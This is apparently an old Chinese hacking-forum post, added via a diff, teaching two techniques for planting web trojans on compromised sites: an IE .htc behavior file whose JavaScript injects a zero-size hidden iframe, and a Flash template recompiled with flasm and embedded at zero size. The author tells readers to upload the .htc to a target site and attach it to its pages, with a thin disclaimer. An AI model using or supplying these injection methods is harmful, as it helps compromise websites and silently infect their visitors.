@@ -1,0 +1,74 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+挂马的两个新方法
+D8888D主贴内容-------------------------------------------------------
+作者：lcx
+
+这里只做技术讨论，不做具体危害的事。如果你要用我的方法去做，我也没办法，呵呵。关于挂马，基本上是在网页原来的代码里加载一个iframe。关于加载iframe，我以前的文章写过几种，这篇文章里再提两个新方法吧。
+
+一、利用htc文件来加载iframe。
+百度百科里对htc文件的解释为：从5.5版本开始，Internet Explorer（IE）开始支持Web 行为的概念。这些行为是由后缀名为.htc的脚本文件描述的，它们定义了一套方法和属性，程序员几乎可以把这些方法和属性应用到HTML页面上的任何元素 上去。Web 行为是非常伟大的因为它们允许程序员把自定义的功能“连接”到现有的元素和控件，而不是必须让用户下载二进制文件（例如ActiveX 控件）来完成这个功能。Web 行为还是推荐的扩展IE对象模型和控件集的方法。微软在它的开发者站点上的DHTML 行为库栏目里提供了几个定制的Web行为。
+这些专业的术语看看就头疼，我们看实际应用。先来看一下vbs写的hello.htc
+★
+
+<attach event="ondocumentready" ONEVENT="Hello()" />
+
+<script language="VBScript">
+
+Function Hello()
+MsgBox "Hello, World!"
+End Function
+
+</script>
+
+★
+
+我们再来写一个1.htm来调用，代码：
+★
+<html>
+<body style="behavior: url(hello.htc)">
+</body>
+</html>
+★
+
+我们把hello.htc和1.htm放在同一个目录下，用ie执行1.htm就会成功弹出一个hello world对话框。如果用vbs来执行的话，中马的人只有ie用户了，用火狐的就漏掉了，我们改成js的，直接用1.htm加载新的hello.htc， 新的代码为：
+★
+<attach event="ondocumentready" ONEVENT="hello()" />
+
+<script>
+function hello()
+{
+var O = document.createElement("iframe");
+O.width = '0';
+O.height = '0';
+O.src="http://www.sohu.com";
+ownerDocument.body.appendChild(O); //注意看，这里用的是ownerDocument，这是精华。
+}
+</script>
+★
+
+这样你把hello.htc传到对方网站目录下，然后在对方页面里加上<body style="behavior: url(hellow1.htc)">就可以成功加载框加了，呵呵。
+
+二、关于swf加载网马的简便做法
+用swf直接加载iframe也不是什么新方法了，不过我这里有一个简单做法，用到的软件就是flasm。我已经做好了一个模板，是swf.swf。我们在dos下运行flasm -d swf.swf>swf.flm，如图1所示。
+
+图1
+
+其中flasm -d swf.swf>swf.flm是生成swf.flm，如果不加>swf.flm是直接显示源码了。你只需要改变图1当中的url地址和框架 高度就可以了。改变地址后，我们再运行一个命令：flasm -a swf.flm就生成你需要的swf了，如图2所示。
+
+图2
+
+我们再写一个swf.htm调用，代码为：
+★
+<head>
+</head>
+<body>
+<embed src=swf.swf witdh=0 height=0></embed>
+</body>
+★
+
+注意的是<embed src=swf.swf witdh=0 height=0></embed> 一定要加在body中间，要不然你不会成功，这是和我写的as代码有关。如果大家有什么疑问，可以去我的blog：[url=http://hi.baidu.com/myvbscript]链接标记http://hi.baidu.com/myvbscript[/url]。
+[文章中的文件1.htm、hello.htc以及swf.htm、swf.htc、flasm.rar已收录在本期光盘]
+
+注：这里我做的flash样本没有提供，也没有什么了，大家主要看看htc的方法吧
